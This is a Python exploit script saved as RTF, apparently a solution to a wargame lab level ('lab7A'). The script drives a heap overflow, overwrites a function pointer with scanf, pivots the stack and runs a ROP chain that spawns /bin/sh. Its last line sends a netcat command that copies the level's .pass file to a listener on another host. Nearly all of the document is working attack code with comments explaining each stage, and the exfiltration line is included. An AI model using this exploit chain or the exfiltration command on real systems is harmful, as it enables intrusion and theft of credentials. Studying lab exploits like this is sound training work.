{\rtf1\ansi\ansicpg1252\deff0\deflang2057{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
{\*\generator Msftedit 5.41.21.2510;}\viewkind4\uc1\pard\sa200\sl276\slmult1\lang9\f0\fs22 import subprocess\par
from struct import pack\par
\par
#gadgets\par
inc_eax = pack('<I', 0x0807cd76)\par
int_80 = pack('<I', 0x08048ef6)\par
pop_ecx = pack('<I', 0x080e76ad)\par
pop_ebx = pack('<I', 0x080481c9)\par
xchg_eax_ebp = pack('<I', 0x08058ff8)\par
xchg_eax_esp = pack('<I', 0x0804bb6c)\par
xor_eax = pack('<I', 0x08055b40)\par
\par
#libc addresses\par
print_f = pack("<I", 0x8050260)\par
scanf = pack("<I", 0x080502c0)\par
\par
#heap addresses - the heap is static so these addresses are from debugging on the host as lab7A\par
m2_func_pointer = pack("<I", 0x80f1af2) #this is the address of our rop_chain\par
bin_sh_address = pack("<I", 0x80f1b3a)\par
zero_ecx_address = pack("<I", 0x80f1b46)\par
\par
#Connect to the server on port 7714\par
sp = subprocess.Popen(["nc", "192.168.136.133", "7741"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)\par
\par
#helper functions\par
def send(data):\par
\tab sp.stdin.write(data)\par
\par
def read_until(needle, proc):\par
\tab current = ""\par
\tab while needle not in current:\par
\tab\tab current += proc.stdout.read(1)\par
\tab print current\par
\par
\par
read_until("Enter Choice:", sp)\par
\par
#stage 1\par
send("1\\n131\\n")\par
read_until("-Enter data to encrypt:", sp)\par
send("A"*131 + "\\n")\par
read_until("Enter Choice:", sp)\par
\par
#stage 2\par
send("1\\n1\\n")\par
read_until("-Enter data to encrypt:", sp)\par
send("A"*1 + "\\n")\par
read_until("Enter Choice:", sp)\par
\par
\par
raw_input() #pause\par
\par
#At this point we have two messages, the first has had its msg_len field overwritten with 0x00424242\par
#Now, when we edit m1, we can overflow the heap and overwrite the function pointer of m2\par
#The goal is to overwrite it with the address of scanf\par
#We then call scanf, and then use direct parameter access to overwrite the return address from main\par
#Just before main returns, we have user data in ebp, so we use two rop-gadgets to change esp to point to the heap \par
\par
                      #value in ebp     #swap eax,ebp   #stack pivot\par
stack_pivot = m2_func_pointer + xchg_eax_ebp + xchg_eax_esp  + "\\x00"*4  #This string overwrites the return address from main and pivots to user data on the heap\par
\par
#This rop chain runs /bin/sh, addresses such as "/bin/sh"  are found on the heap, no info leak needed\par
rop_chain = xor_eax + inc_eax*11 + pop_ebx + bin_sh_address + pop_ecx + zero_ecx_address + int_80 + pack("<I", 0xbffffc98)  + "/bin//sh" +"\\x00"*4 + "\\x00"*12\par
\par
#Trigger the edit message overflow from m1 to m2, because of the way the input is buffered the order is a bit weird\par
#Took a while to figure out which order to edit a message and then trigger scanf in such a way as to send scanf data\par
#For some reason this whole exploit wouldn't work unless the sanf address was send before the stack pivot, I lucked out and accidentally had it there\par
send(("2\\n0\\n4\\n1\\n" + scanf + stack_pivot + "\\n" + "5\\n").ljust(4096, "\\n"))                                             \par
\par
#This is the actual overwrite of m2, when we trigger print_index of m2, we actually force a call to scanf("%18$s\\n")\par
#The data that scanf reads is in the previous send call, from stack_pivot onwards.\par
#We also store our ropchain in m2\par
send(("A"*140 + scanf + '%18$s\\n' + rop_chain).ljust(257, '\\x00')) \par
\par
\par
read_until("Enter Choice:", sp)\par
read_until("Enter Choice:", sp)\par
\par
x = raw_input() #pause 1 more time\par
\par
#Viewing output from the process was a pain, so I used a netcat listener to send me the pass file\par
send("nc 192.168.136.128 4444 < /home/lab7end/.pass\\n")\par
}
